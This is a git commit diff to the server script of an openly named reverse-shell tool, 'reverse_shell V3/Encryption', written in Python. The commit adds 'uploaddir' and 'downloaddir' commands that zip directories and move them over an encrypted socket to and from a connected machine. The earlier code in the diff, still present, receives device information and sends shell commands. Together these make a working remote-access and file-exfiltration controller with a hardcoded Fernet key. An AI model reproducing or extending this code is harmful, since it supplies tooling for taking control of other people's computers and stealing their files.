4bd5c3ea7a54385c32855c00b8fd54e3b9eb5693
Shail Murtaza <58264560+ShailMurtaza@users.noreply.github.com>
2020-07-29 00:25:06 +0500

    Update server.py

--- reverse_shell V3/Encryption/server.py
+++ reverse_shell V3/Encryption/server.py
@@ -1,7 +1,7 @@
 from __future__ import print_function
 from time import sleep
-# import readline module when using linux. This will be usefull during typing commands
-# import readline
+from os import remove
+from shutil import make_archive
 from socket import socket, error
 from cryptography.fernet import Fernet
 key = "jwtU6dABBShoW0T6PGQP7d5mZDZjEUezwrDRmgjXr-g="
@@ -19,15 +19,13 @@ def decrypt_response(response):
     return cipher_suite.decrypt(response)
 
 
-
 # Function used for adding header to data which tells
-# that what is length of comming data 
+# that what is length of comming data
 # format == [length of data under 10] + encrpted command
 # It means you can send 9999999999 bytes or 9.9 GB of data
 # For large data you can change size in my case it is 10
 # If you change size then don't forget to change this size in server side script
 # And also don't forget to change in "recvall()" function
-
 def add_header(data):
     data = encrypt_cmd(data)
     data = "{:<10}".format(len(data)) + data
@@ -35,7 +33,7 @@ def add_header(data):
 
 
 # Function used for receiving all comming data using header
-# Please set data_part receiving bytes upto 10 bytes 
+# Please set data_part receiving bytes upto 10 bytes
 # so header can completely receive in my case it is "1024" bytes
 def recvall(conn):
     new_data = True
@@ -68,14 +66,33 @@ def connection():
     print("Listening ......")
     conn, address = s.accept()
     print("Connected with " + str(address))
-	###################################
-	# For receiving some information about devise
+    ###################################
+    # For receiving some information about devise
     response = recvall(conn)
     print(response, end="")
-	####################################
+    ####################################
     while True:
         cmd = (raw_input(">"))
-        if cmd[:6] == "upload":
+        if cmd[:9] == "uploaddir":
+            dir_name = cmd[11:].split(",,")
+            if len(dir_name) == 2:
+                try:
+                    print("Making archive of directory " + dir_name[0])
+                    archive = make_archive(dir_name[0], 'zip', dir_name[0])
+                    data = open(archive, "rb").read()
+                    remove(archive)
+                    print("Sending")
+                    file_data = (cmd[:9] + dir_name[1] + "||=shail=||" + data)
+                    file_data = add_header(file_data)
+                    conn.send(file_data)
+                    print("File sended and wating for response ...")
+                    response = recvall(conn)
+                    print(response, end="")
+                except (IOError, WindowsError):
+                    print("Not Any File Found in server")
+            else:
+                input_check()
+        elif cmd[:6] == "upload":
             file = cmd[8:].split(",,")
             if len(file) == 2:
                 try:
@@ -93,6 +110,25 @@ def connection():
                     print(response, end="")
                 except IOError:
                     print("Not Any File Found in server")
+            else:
+                input_check()
+        elif cmd[:11] == "downloaddir":
+            dir_name = cmd[13:].split(",,")
+            if len(dir_name) == 2:
+                file_data = add_header(cmd[:11] + dir_name[0])
+                conn.send(file_data)
+                print("Request sended ...")
+                data = recvall(conn)
+                data = data.split("||=shail=||")
+                if data[0] == "not found":
+                    print("Not Any File Found ...")
+                else:
+                    try:
+                        open((dir_name[1] + "_downloaded.zip"), "wb").write(data[0])
+                        print("Directory has been received")
+                    except IOError:
+                        print("No such file or directory in server")
+                print(data[1], end="")
             else:
                 input_check()
         elif cmd[:8] == "download":
